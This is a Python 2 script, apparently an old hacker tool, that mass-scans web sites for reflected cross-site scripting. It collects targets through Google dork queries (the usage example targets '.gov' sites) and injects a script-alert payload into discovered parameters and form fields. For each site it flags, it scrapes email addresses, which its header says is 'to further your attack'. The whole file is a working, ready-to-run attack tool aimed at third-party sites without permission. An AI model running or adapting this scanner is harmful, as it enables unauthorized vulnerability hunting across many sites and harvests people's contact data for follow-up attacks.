#!/usr/bin/python
#XSS Scanner that can find hosts using a google query or search one site.
#If XSS is found it attempts to collect email addresses to further your attack
#or warn the target of the flaw. When the scan is complete 
#it will print out the XSS's found and or write to file, it will find false positives
#so manually check before getting to excited. It also has verbose mode and
#you can change the alert pop-up message, check options!!
#Warning: Don't change the alert pop-up to something that will be different in the source. (symbol encoding)
#d3hydr8[at]gmail[dot]com

import sys, urllib2, re, sets, random, httplib, time, socket

def title():
	print "\n\t   d3hydr8[at]gmail[dot]com XSS Scanner v1.1"
	print "\t-----------------------------------------------"
	
def usage():
	title()
	print "\n  Usage: python XSSscan.py <option>\n"
	print "\n  Example: python XSSscan.py -g inurl:'.gov' 200 -a 'XSS h4ck3d' -write xxs_found.txt -v\n"
	print "\t[options]"
	print "\t   -g/-google <query> <num of hosts> : Searches google for hosts"
	print "\t   -s/-site <website> : Searches just that site"
	print "\t   -a/-alert <alert message> : Change the alert pop-up message"	
	print "\t   -w/-write <file> : Writes potential XSS found to file"
	print "\t   -v/-verbose : Verbose Mode\n"

def StripTags(text):
     finished = 0
     while not finished:
         finished = 1
         start = text.find("<")
         if start >= 0:
             stop = text[start:].find(">")
             if stop >= 0:
                 text = text[:start] + text[start+stop+1:]
                 finished = 0
     return text
	
def timer():
	now = time.localtime(time.time())
	return time.asctime(now)

def geturls(query):
	
	counter =  10
	urls = []
	
	while counter < int(sys.argv[3]):
		url = 'http://www.google.com/search?hl=en&q='+query+'&hl=en&lr=&start='+repr(counter)+'&sa=N'
		opener = urllib2.build_opener(url)
		opener.addheaders = [('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)')]
		data = opener.open(url).read()
		hosts = re.findall(('\w+\.[\w\.\-/]*\.\w+'),StripTags(data))
		#Lets add sites found to a list if not already or a google site.
		#We don't want to upset the people that got our list for us.
		for x in hosts:
			if x.find('www') != -1:
				x = x[x.find('www'):]
			if x not in urls and re.search("google", x) == None:
				urls.append(x)
		counter += 10
	return urls
		
def getemails(site):

	try:
		if site.split("/",1)[0] not in done:
			print "\t[+] Collecting Emails:",site.split("/",1)[0]
			webpage = urllib2.urlopen("http://"+site.split("/",1)[0]).read()
			emails = re.findall('[\w\.\-]+@[\w\.\-]+\.\w\w\w', webpage)
			done.append(site.split("/",1)[0])
			if emails:
				return emails
	except(IndexError):
		pass
	
def getvar(site):
	
	names = []
	actions = []
	print "\n","-"*45
	print "[+] Searching:",site
	try:
		webpage = urllib2.urlopen("http://"+site).read()
		emails = re.findall('[\w\.\-]+@[\w\.\-]+\.\w\w\w', webpage)
		var = re.findall("\?[\w\.\-/]*\=",webpage)
		if len(var) >=1:
			var = list(sets.Set(var))
		found_action = re.findall("action=\"[\w\.\-/]*\"", webpage.lower())
		found_action = list(sets.Set(found_action))
		if len(found_action) >= 1:
			for a in found_action:
				a = a.split('"',2)[1]
				try:
					if a[0] != "/":
						a = "/"+a
				except(IndexError):
						pass
				actions.append(a)
		found_names = re.findall("name=\"[\w\.\-/]*\"", webpage.lower())
		found_names = list(sets.Set(found_names))
		for n in found_names:
			names.append(n.split('"',2)[1])
		print "[+] Variables:",len(var),"| Actions:",len(actions),"| Fields:",len(names)
		
		if len(var) >= 1:
			for v in var:
				if site.count("/") >= 2:
					for x in xrange(site.count("/")):
						tester(site.rsplit('/',x+1)[0]+"/"+v+xss)
				tester(site+"/"+v+xss)
		
		if len(names) >= 1:
			for n in names:
				if site.count("/") >= 2:
					for x in xrange(site.count("/")):
						tester(site.rsplit('/',x+1)[0]+"/"+"?"+n+"="+xss)
				tester(site+"/"+"?"+n+"="+xss)
		
		if len(actions) != 0 and len(names) >= 1:
			for a in actions:
				for n in names:
					if site.count("/") >= 2:
						for x in xrange(site.count("/")):
							tester(site.rsplit('/',x+1)[0]+a+"?"+n+"="+xss)
					#tester(site.split("/")[0]+a+"?"+n+"="+xss)
			
		if len(actions) != 0 and len(var) >= 1:
			for a in actions:
				for v in var:
					if site.count("/") >= 2:
						for x in xrange(site.count("/")):
							tester(site.rsplit('/',x+1)[0]+a+v+xss)
					else:
						tester(site.split("/")[0]+a+v+xss)	
		if sys.argv[1].lower() == "-g" or sys.argv[1].lower() == "-google":
			urls.remove(site)
	
	except(socket.timeout, IOError, ValueError, socket.error, socket.gaierror):
		if sys.argv[1].lower() == "-g" or sys.argv[1].lower() == "-google":
			urls.remove(site)
		pass
			
def tester(target):
	
	if verbose ==1:
		print "Target:",target
	
	try:
		source = urllib2.urlopen("http://"+target).read()
		h = httplib.HTTPConnection(target.split('/')[0])
		try:
			h.request("GET", "/"+target.split('/',1)[1])
		except(IndexError):
			h.request("GET", "/")
		r1 = h.getresponse()
		if re.search(xss.split("%27", 2)[1].replace("%2D","-"), source) != None and r1.status not in range(300, 418):
			if target not in found_xss:
				print "\n[!] XSS:", target
				print "\t[+] Response:",r1.status, r1.reason
				emails = getemails(target)
				if emails:
					print "\t[+] Email:",len(emails),"addresses\n"
					found_xss.setdefault(target, list(sets.Set(emails)))
				else:
					found_xss[target] = "None"
	except(socket.timeout, socket.gaierror, socket.error, IOError, ValueError, httplib.BadStatusLine):
		pass
	except():
		pass
				
if len(sys.argv) <= 2:
	usage()
	sys.exit(1)
 
for arg in sys.argv[1:]:
	if arg.lower() == "-v" or arg.lower() == "-verbose":
		verbose = 1
	if arg.lower() == "-w" or arg.lower() == "-write":
		txt = sys.argv[int(sys.argv[1:].index(arg))+2]
	if arg.lower() == "-a" or arg.lower() == "-alert":
		message = re.sub("\s","%2D",sys.argv[int(sys.argv[1:].index(arg))+2])
		
title()
#the xss which is a standard alert popup box, feel free to change "d3hydr8 owns you" :)
xss = "%22%3E%3Cscript%3Ealert%28%27D3HYDR8%2D0wNz%2DY0U%27%29%3C%2Fscript%3E" 
socket.setdefaulttimeout(3)
found_xss = {}
done = []
count = 0
print "\n[+] XSS_scan Loaded"
try:
	if verbose ==1:
		print "[+] Verbose Mode On"
except(NameError):
	verbose = 0
	print "[+] Verbose Mode Off"
try:
	if message:
		xss = xss.replace("D3HYDR8%2D0wNz%2DY0U",message)
		print "[+] Alert:",message
except(NameError):
	print "[+] Alert: D3HYDR8%2D0wNz%2DY0U"
	pass
try:
	if txt:
		print "[+] File:",txt
except(NameError):
	txt = None
	pass
if sys.argv[1].lower() == "-g" or sys.argv[1].lower() == "-google":	
	if sys.argv[3].isdigit() == False:
		print "\n[-] Host [ ",sys.argv[3],"] must be a number.\n"
		sys.exit(1)
	query = re.sub("\s","+",sys.argv[2])
	print "[+] Query:",query
	print "[+] Querying Google..."
	urls = geturls(query)
	print "[+] Collected:",len(urls),"hosts"
	print "[+] Started:",timer()
	time.sleep(3)
	while len(urls) > 0:
		print "-"*45
		print "\n[-] Length:",len(urls),"remain"
		getvar(random.choice(urls))
if sys.argv[1].lower() == "-s" or sys.argv[1].lower() == "-site":
	site = sys.argv[2]
	print "[+] Site:",site
	if site[:7] == "http://":
		site = site.replace("http://","")
	print "[+] Started:",timer()
	time.sleep(3)
	getvar(site)

print "-"*65
print "\n\n[+] Potential XSS found:",len(found_xss),"\n"
time.sleep(3)
if txt:
	xss_file = open(txt, "a")
for k in found_xss.keys():
	count+=1
	if txt:
		print "[+] Writing Data:",txt
		xss_file.writelines("["+str(count)+"] "+k+"\n")
	print "\n["+str(count)+"]",k
	addrs = found_xss[k]
	if addrs != "None":
		print "\t[+] Email addresses:" 
		for addr in addrs: 
			if txt:
				xss_file.writelines("\t"+addr+"\n")
			print "\t   -",addr
print "\n[-] Done -",timer(),"\n"




